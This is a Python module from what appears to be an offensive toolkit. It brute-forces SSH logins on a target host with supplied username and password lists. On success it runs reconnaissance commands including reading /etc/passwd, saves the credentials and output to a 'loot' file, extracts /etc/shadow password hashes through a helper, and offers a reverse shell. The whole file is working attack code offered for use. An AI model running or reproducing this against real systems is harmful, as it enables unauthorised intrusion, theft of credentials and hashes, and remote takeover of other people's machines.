import paramiko
from engines.utils import log, get_target_dir

class SSHEngine:
    def __init__(self, target_ip, port=22):
        self.target_ip = target_ip
        self.port = port

    def brute_force(self, users, passwords):
        log(f"Starting SSH Pivot on {self.target_ip}:{self.port}...")
        for user in users:
            for pwd in passwords:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    log(f"  Trying: {user} : {pwd}", "INFO")
                    client.connect(self.target_ip, port=self.port, username=user, password=pwd, timeout=5)
                    log(f"SSH ACCESS SUCCESS: {user}@{self.target_ip}:{self.port} (Pass: {pwd})", "PWN")
                    
                    # تنفيذ أوامر استطلاع
                    commands = ["whoami", "uname -a", "id", "cat /etc/passwd | head -5"]
                    t_dir = get_target_dir(self.target_ip)
                    with open(f"{t_dir}/ssh_loot.txt", "w", encoding="utf-8") as f:
                        f.write(f"=== SSH ACCESS: {user}@{self.target_ip}:{self.port} ===\n")
                        f.write(f"Password: {pwd}\n\n")
                        for cmd in commands:
                            try:
                                stdin, stdout, stderr = client.exec_command(cmd)
                                output = stdout.read().decode().strip()
                                log(f"  [{cmd}]: {output}", "SUCCESS")
                                f.write(f"[{cmd}]:\n{output}\n\n")
                            except: pass
                    
                    from engines.hash_extractor import extract_shadow_via_ssh, write_hashes_file
                    shadow_hashes = extract_shadow_via_ssh(client)
                    if shadow_hashes:
                        write_hashes_file(self.target_ip, shadow_hashes)

                    from engines.reverse_shell_prompt import offer_reverse_shell
                    offer_reverse_shell(
                        f"SSH ({user}@{self.target_ip}:{self.port})",
                        self.target_ip,
                        ssh_client=client,
                        ssh_port=self.port,
                    )

                    client.close()
                    return True
                except paramiko.AuthenticationException:
                    client.close()
                except Exception as e:
                    client.close()
        log(f"SSH Brute-force on port {self.port} finished. No valid credentials.", "INFO")
        return False
